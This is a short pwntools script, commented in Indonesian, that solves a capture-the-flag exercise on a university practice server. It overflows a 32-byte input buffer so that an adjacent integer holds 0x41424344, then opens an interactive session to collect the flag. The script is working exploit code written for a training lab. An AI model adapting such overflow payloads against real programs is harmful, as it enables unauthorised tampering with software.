from pwn import *

# 1. Konfigurasi
exe = './chall'
elf = ELF(exe)
context.binary = exe

# Koneksi ke server remote
io = remote('practice-digitalsecuritylab.di.unipi.it', 10002)

# 2. Kalkulasi Offset
# v4 buffer: 32 bytes
# v5 target: integer (4 bytes)
# Kita harus mengisi 32 byte v4 agar sampai tepat di v5
offset = 32

# 3. Target Value
# Nilai yang diminta: 1094861636
target_value = 1094861636 # Setara dengan 0x41424344

# 4. Menyusun Payload
# p32 digunakan karena variabel v5 adalah integer 4-byte (int)
payload = flat({
    offset: p32(target_value)
})

log.info(f"Payload length: {len(payload)}")
log.info(f"Target Value: {hex(target_value)}")

# 5. Mengirim Payload
io.recvuntil(b'Enter your name: ')
io.sendline(payload)

# 6. Mendapatkan Flag
io.interactive()
